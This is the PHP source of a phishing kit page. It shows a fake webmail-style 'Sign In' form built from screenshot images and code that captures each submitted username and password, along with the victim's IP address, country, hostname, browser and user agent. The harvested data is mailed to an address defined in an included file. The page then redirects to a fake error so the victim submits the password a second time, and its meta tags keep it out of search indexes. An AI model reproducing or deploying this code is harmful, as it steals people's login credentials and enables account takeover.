<?php

session_start();

if (isset($_GET['path'])) {
$path = $_GET['path'];
}
if (isset($_GET['err'])) {
$err = $_GET['err'];
}
if ($err == '0'){
$height = '802';
$left = '790';
$fromtopuser = '335';
$fromtoppass = '418';
$background = "background.png";
$status = '<div style="position:absolute; overflow:hidden;left:685px; top:112px; width:551px; height:486px; z-index:1;"><img src="assets/loginform.png" width="551" height="486"></div>';
$submit = '<div style="position:absolute; overflow:hidden; border-radius: 4px; left:789px; top:515px; width:343px; height:44px; z-index:4">
<button target="_parent" tabindex="0" class="btn btn-primary btn-purchase btn-block" id="submitBtn" type="submit">Sign In</button>
</div>';
}
elseif ($err == '1'){
$send = 'login.php';
$height = '935';
$left = '787';
$fromtopuser = '469';
$fromtoppass = '551';
$background = "background_.png";
$status = '<div style="position:absolute; overflow:hidden;left:683px; top:112px; width:549px; height:619px; z-index:1;">
<img src="assets/logonform.png" width="549" height="619"></div>';
$submit = '<div style="position:absolute; overflow:hidden; border-radius: 4px; left:786px; top:649px; width:343px; height:44px; z-index:4">
<button target="_parent" tabindex="0" class="btn btn-primary btn-purchase btn-block" id="submitBtn" type="submit">Sign In</button>
</div>';
}

require_once '../../mail.php';
require_once 'geo.php';
require_once 'sync.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$br = $obj->showInfo('browser');
$op = $obj->showInfo('os');
$vr = $obj->showInfo('version');
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

if (isset($_POST['username']) || isset($_POST['password'])) { 
$_SESSION["email"] = $email = $_POST["username"];
$_SESSION["passwd"] = $passwd = $_POST["password"];

$message .= "-------------------------------------------------------------------------------------\n";
$message .= "User ID: ".$email."\n";
$message .= "Password: ".$passwd."\n";
$message .= "-------------------------------------------------------------------------------------\n";
$message .= "Web Browser: ".$br."\n";
$message .= "Web Browser Version: ".$vr."\n";
$message .= "Operating System: ".$op."\n";
$message .= "IP: ".$ip." | ".$cn."\n";
$message .= "Submitted: ".$datum."\n";
$message .= "Host Name: ".$hostname."\n";
$message .= "User Agent: ".$ua."\n";
$message .= "-------------------------------------------------------------------------------------\n";

$subject = "You've got mail from $ip ($cn)";
$headers = "From: GOC $cc <noreply>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

if (empty($email) || empty($passwd)) {
header("Location: ./?app=email&realm=pass&path=$path&err=0");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: ./?app=email&realm=pass&path=$path&err=1");
}

}

?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Sign In</title>
<meta http-equiv='content-type' content="text/html; charset=ISO-8859-5">
<meta http-equiv='content-type' content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/ico" sizes="16*16" href="assets/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<style>

element {
}
.input-box:active {
    color: #2b2b2b !important;
	background: #fff !important;
    border-color: #2b2b2b  !important;
}
.form-control {
    display: block;
    height: 44px;
    width: 100%;
    padding: 6px 12px;
    font-size: 1rem;
    line-height: 1.5rem;
    color: #2b2b2b;
	background-color: #fff;
	background-image: none;
	background-clip: padding-box;
	border: 1px solid #d4dbe0;
    vertical-align: middle;
    border-radius: 0;
    box-shadow: none;
    transition: .3s all ease-in-out;
}
button, input {
    overflow: visible;
}
button, input, optgroup, select, textarea {
    margin: 0;
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
}
*, ::after, ::before {
    box-sizing: border-box;
}
.ux-card {
    color: #111;
}
.card {
    word-wrap: break-word;
}
.ux-app {
    color: #444;
}
body {
    font-family: gdsherpa,Helvetica,Arial,sans-serif;
    font-size: 1rem;
    font-weight: 400;
    line-height: 1.5rem;
    color: #111;
    text-align: left;
}

#login-panel .card-block #submitBtn {
    min-width: 100%;
}
#login-panel .card-block button:not(.alternative-login-button) {
    max-height: 40px;
}
.btn-purchase:hover {
    color: #fff !important;
	background: #444 !important;
	border-color: #444 !important;
}
.btn-primary:hover {
    color: #fff !important;
    background: #444 !important;
    border-color: #444 !important;
}
.btn:focus, .btn:hover {
    text-decoration: none;
}
[type="reset"], [type="submit"], button, html [type="button"] {
    -webkit-appearance: button;
}
.btn-block {
    display: block;
    width: 100%;
}
.btn-purchase {
    color: #fff !important;
    background: #111 !important;
    border-color: #111 !important;
}
.btn-primary {
    color: #fff !important;
    background: #111 !important;
    border-color: #111 !important;
}
.btn, .btn.active, .btn:active {
    box-shadow: none;
    background-image: none;
}
.btn {
    max-width: 360px;
}
.btn {
    max-width: 343px;
}
.btn {
    transition: background-color .15s ease-in-out,border-color .15s ease-in-out,box-shadow .15s ease-in-out;
    padding: 10px 24px 9px;
    font-size: 1rem;
    line-height: 1.5rem;
    border-width: 0;
    display: inline-block;
    min-height: 44px;
    text-align: center;
    vertical-align: middle;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    border: 0 solid 
    transparent;
        border-top-color: transparent;
        border-right-color: transparent;
        border-bottom-color: transparent;
        border-left-color: transparent;
    font-weight: 700;
    text-decoration: none;
    text-transform: none;
    white-space: normal;
    cursor: pointer;
    outline: 0;
}
button, select {
    text-transform: none;
}
button, input {
    overflow: visible;
}
button, input, optgroup, select, textarea {
    margin: 0;
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
}
button {
    border-radius: 0;
}
*, ::after, ::before {
    box-sizing: border-box;
}
.ux-card {
    color: #111;
}
.card {
    word-wrap: break-word;
}
.ux-app {
    color: #444;
}
html {
    font-family: sans-serif;
    line-height: 1.15;
    -webkit-text-size-adjust: 100%;
}
</style>

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<script>
$("#login").on('submit', function() {
   alert($("#submitBtn").val());
});
</script>
</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:<?php echo $height; ?>px; z-index:0">
<img src="assets/<?php echo $background; ?>" alt="" title="" width="1349" border="0" height="<?php echo $height; ?>">
</div>
<?php echo $status; ?>
<form id="login" action="<?php echo $send; ?>" name="login" method="post" onsubmit="return validate()">
<input name="username" style="position:absolute; overflow:hidden; left:<?php echo $left; ?>px; top:<?php echo $fromtopuser; ?>px; width:343px; height:44px; z-index:2" type="username" id="username" tabindex="1" class="username-input ctHidden form-control input-box" href="javascript:;" placeholder="<?php echo isset($_GET['path']) ? base64_decode($_GET['path']) : '' ?>" value="<?php echo isset($_GET['path']) ? base64_decode($_GET['path']) : '' ?>">
<input name="password" style="position:absolute; overflow:hidden; left:<?php echo $left; ?>px; top:<?php echo $fromtoppass; ?>px; width:343px; height:44px; z-index:3" type="password" id="password" tabindex="2" class="ctHidden form-control input-box" required="">
<?php echo $submit; ?>
</form>
</body>
</html>